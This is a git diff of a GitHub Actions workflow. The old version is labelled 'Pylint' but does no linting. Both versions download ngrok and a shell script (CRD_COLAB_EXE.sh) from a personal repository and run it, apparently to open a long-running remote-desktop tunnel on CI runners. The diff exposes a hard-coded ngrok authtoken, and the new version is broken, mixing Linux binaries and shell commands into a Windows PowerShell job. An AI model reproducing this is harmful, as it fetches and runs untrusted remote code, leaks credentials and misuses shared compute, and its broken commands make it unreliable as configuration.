@@ -1,28 +1,23 @@
-name: Pylint
+name: RUN_RDP
 
-on: [push]
+on: workflow_dispatch
 
 jobs:
   build:
 
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
+    timeout-minutes: 9999
 
     steps:
-    - uses: actions/checkout@v2
-    - name: Set up Python 3.8
-      uses: actions/setup-python@v1
-      with:
-        python-version: 3.8
-    - name: Install dependencies
+    - name: Download NGROK - NSSM.
       run: |
-        python -m pip install --upgrade pip
-        pip install pylint
-    - name: Analysing the code with pylint
-      run: |
-    - run: unzip ngrok-stable-linux-amd64.zip
-    - run: ./ngrok authtoken 1uJ7Os7lZl6gnMUCyMMpI3qVClR_4FYZvZLaXMGJycSHCpiXG
-    - run: wget https://raw.githubusercontent.com/admin123356/bagol1/main/CRD_COLAB_EXE.sh &> /dev/null
-    - run: chmod +x CRD_COLAB_EXE.sh
-    - run: ./CRD_COLAB_EXE.sh
-    - run: sleep 43200
-
+        Invoke-WebRequest wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 
+        Invoke-WebRequest wget https://raw.githubusercontent.com/admin123356/bagol1/main/CRD_COLAB_EXE.sh
+    - name: unzip
+      run: unzip ngrok-stable-linux-amd64.zip
+    - name: ngrok
+      run: .\ngrok authtoken 1uJ7Os7lZl6gnMUCyMMpI3qVClR_4FYZvZLaXMGJycSHCpiXG
+    - name: chmod
+      run: chmod +x CRD_COLAB_EXE.sh
+    - name: ngrok
+      run: .\CRD_COLAB_EXE.sh
